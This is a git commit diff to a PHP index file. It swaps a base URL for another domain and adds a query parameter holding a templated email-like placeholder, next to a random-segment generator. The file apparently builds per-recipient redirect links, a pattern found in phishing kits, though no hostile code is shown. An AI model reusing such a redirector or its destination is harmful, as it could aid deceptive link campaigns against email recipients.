be4ddd1fa62ae0a7c2d7fd2d59f9e25d2e909e58
anumumadavum38-ops <anumumadavum38@gmail.com>
2026-07-20 22:03:35 -0300

    Update index.php

--- index.php
+++ index.php
@@ -1,5 +1,5 @@
 <?php
-$baseUrl = 'https://lemonarchitect.com/';
+$baseUrl = 'https://alliancecarcare.com/?cid=%documento@assinatura.com.br%/';
 
 function generateSegment($length) {
   $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
